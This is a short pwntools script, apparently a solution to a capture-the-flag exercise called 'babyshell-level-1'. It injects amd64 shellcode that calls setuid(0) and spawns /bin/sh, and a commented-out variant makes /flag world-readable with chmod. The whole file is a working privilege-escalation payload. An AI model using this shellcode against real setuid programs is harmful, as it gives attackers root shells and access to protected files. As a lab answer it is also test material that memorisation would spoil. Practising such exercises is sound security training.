from pwn import *

p = process('/challenge/babyshell-level-1', aslr=False)
context.update(arch="amd64")

shellcode = asm('''
        mov rax, 0x69
        mov rdi, 0
        syscall

        mov rax, 59
        lea rdi, [rip+binsh]
        mov rsi, 0
        mov rdx, 0
        syscall
binsh:
        .string "/bin/sh"
''')

# shellcode = asm('''
#         mov rax, 0x5a
#         lea rdi, [rip+flag]
#         mov rsi, 0777
#         syscall
# flag:
#         .ascii "/flag\0"
# ''')

p.send(shellcode)
p.interactive()
